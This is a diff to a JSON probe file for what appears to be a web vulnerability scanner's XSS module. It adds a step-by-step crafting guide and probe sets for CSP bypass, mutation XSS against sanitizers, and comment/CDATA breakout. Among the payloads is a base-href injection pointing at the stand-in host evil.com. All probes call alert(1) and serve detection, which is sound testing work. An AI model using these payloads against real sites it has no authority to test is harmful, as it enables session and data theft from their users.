@@ -1,5 +1,15 @@
 {
   "category": "xss",
+  "craft_guidance": [
+    "1. IDENTIFY OUTPUT CONTEXT: HTML body, attribute (quoted/unquoted), JS string, JS template literal, URL, CSS, comment/CDATA.",
+    "2. BREAK THE CONTEXT: HTML=<tag>, attribute=' or \" escape, JS=' or \"+;, template=${}, URL=javascript: or data:.",
+    "3. CHECK ENCODING: Test < > ' \" & / ( ) individually. If < > blocked but ' is not, use attribute context (onfocus=alert(1) autofocus).",
+    "4. EVENT HANDLERS: <script> blocked? Use onerror, onload, onfocus+autofocus, ontoggle, onmouseover. Tags blocked? Use <svg>, <details>, <body>.",
+    "5. CSP BYPASS: 'self' => find JSONP/file upload. 'unsafe-eval' => eval/setTimeout/Function(). Nonce => find leak. base-uri => inject <base>.",
+    "6. WAF BYPASS: HTML entities, double encoding, mixed case, null bytes, Unicode normalization, tag mutation (mXSS).",
+    "7. DOM XSS: Trace sources (location.hash, postMessage, localStorage) to sinks (innerHTML, eval, jQuery.html). No server reflection needed.",
+    "8. STORED: Profile name rendered in admin panel or email. Test where stored values appear in different output contexts."
+  ],
   "contexts": {
     "html": {
       "description": "Reflected XSS probes for HTML body context — tests raw tag injection and script execution",
@@ -7,8 +17,8 @@
       "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
       "probes": [
         {
-          "payload": "<{{marker}}>",
-          "description": "Bare tag injection to detect unescaped HTML reflection",
+          "payload": "<swk{{marker}}>",
+          "description": "Unique marker tag injection — reflection of <swkXXXX> confirms unescaped HTML context (won't match natural tags)",
           "matchers": [
             {"type": "reflection", "check_variants": true}
           ],
@@ -282,6 +292,127 @@
         {
           "payload": "<body onload=alert(1)>",
           "description": "Body onload injection — effective when input is injected near the top of the page body",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    },
+    "csp_bypass": {
+      "description": "CSP bypass XSS payloads -- exploit permissive CSP directives via JSONP callbacks, base-uri, trusted types, and nonce prediction",
+      "tech_match": [],
+      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword", "callback", "jsonp", "cb"],
+      "probes": [
+        {
+          "payload": "<script src=\"/api/jsonp?callback=alert(1)//\"></script>",
+          "description": "JSONP callback XSS -- script-src 'self' bypassed via same-origin JSONP endpoint reflecting callback parameter",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "<base href=\"https://evil.com/\">",
+          "description": "base-uri injection -- redirects all relative script/resource URLs to attacker domain when base-uri not restricted in CSP",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
+          "description": "CSP bypass via trusted CDN (AngularJS) -- if script-src includes cdnjs or googleapis, load Angular and use template injection",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline'\">",
+          "description": "CSP override via meta tag injection -- if meta tags are injectable, overwrite CSP to allow inline scripts (only works if no HTTP header CSP)",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    },
+    "mxss": {
+      "description": "Mutation XSS (mXSS) payloads -- exploit browser HTML parser normalization differences to bypass DOMPurify and server-side sanitizers",
+      "tech_match": [],
+      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword", "html", "content", "body"],
+      "probes": [
+        {
+          "payload": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+          "description": "mXSS via math/mtext context switch -- browser re-parses HTML after sanitizer, moving img out of inert context into active DOM",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<svg><style><img src=x onerror=alert(1)></style></svg>",
+          "description": "mXSS via SVG foreign content -- style tag in SVG is parsed differently than in HTML, img tag may escape sanitization",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">",
+          "description": "Nested namespace confusion mXSS -- multiple namespace switches confuse sanitizer tree-walking vs browser parsing",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    },
+    "comment_breakout": {
+      "description": "HTML comment and CDATA section breakout -- escape from comment context or XML CDATA sections to inject executable content",
+      "tech_match": [],
+      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "probes": [
+        {
+          "payload": "--><img src=x onerror=alert(1)><!--",
+          "description": "HTML comment breakout -- close comment with --> then inject payload, re-open comment to maintain page structure",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "--!><img src=x onerror=alert(1)>",
+          "description": "Non-standard comment close --!> -- some browsers accept --!> as comment terminator while sanitizers may not recognize it",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "]]><img src=x onerror=alert(1)>",
+          "description": "CDATA section breakout -- close CDATA with ]]> to inject HTML in XML/XHTML documents",
           "matchers": [
             {"type": "reflection", "check_variants": true}
           ],
